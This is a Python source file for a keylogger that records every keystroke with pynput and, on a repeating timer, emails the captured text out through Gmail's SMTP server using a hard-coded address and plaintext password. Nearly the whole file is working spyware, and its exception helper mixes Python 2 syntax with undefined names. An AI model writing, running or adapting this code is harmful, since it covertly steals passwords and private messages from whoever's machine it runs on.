import pynput.keyboard, threading, smtplib

class KeyLogger(object):
	def __init__(self, username, password, reporting_interval):
		self._reporting_interval = reporting_interval
		self._log = ""
		self._username = username
		self._password = password

	def PrintException(self):
			exc_type, exc_obj, tb = sys.exc_info()
			f = tb.tb_frame
			lineno = tb.tb_lineno
			filename = f.f_code.co_filename
			linecache.checkcache(filename)
			line = linecache.getline(filename, lineno, f.f_globals)
			if args:
				print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ problem here ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
				print(args)
			print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)

	def get_username(self):
		return self._username

	def get_password(self):
		return self._password

	def get_reporting_interval(self):
		return self._reporting_interval

	def set_log(self, log):
		self._log = self._log + log

	def get_log(self):
		return self._log

	def clear_log(self):
		self._log = ""

	def process_key_press(self, key):
		try:
			self.set_log(str(key.char))

		except AttributeError:
			if key == key.space:
				self.set_log(" ")
			else:
				self.set_log(" " + str(key) + " ")
		

	def send_mail(self, email, password):
		server = smtplib.SMTP("smtp.gmail.com", 587) # create instance of smtp server
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, self.get_log()) #from, to, message
		print("at time of message: " + self.get_log())
		self.clear_log()
		server.quit()

	
	def report(self):
		username = self.get_username()
		password = self.get_password()

		if not self.get_log() == "":
			self.send_mail(username, password)
			print("Input captured: " + self.get_log())
		else:
			print("No input captured")
		
		timer = threading.Timer(self.get_reporting_interval(), self.report)
		print("Timer started")
		timer.start()

	def run(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press) #callback fn arg
		with keyboard_listener:
			self.report()
			keyboard_listener.join()
			

keylogger = KeyLogger("coolandunusualtestserver@gmail.com", "bepis123!", 5)
keylogger.run()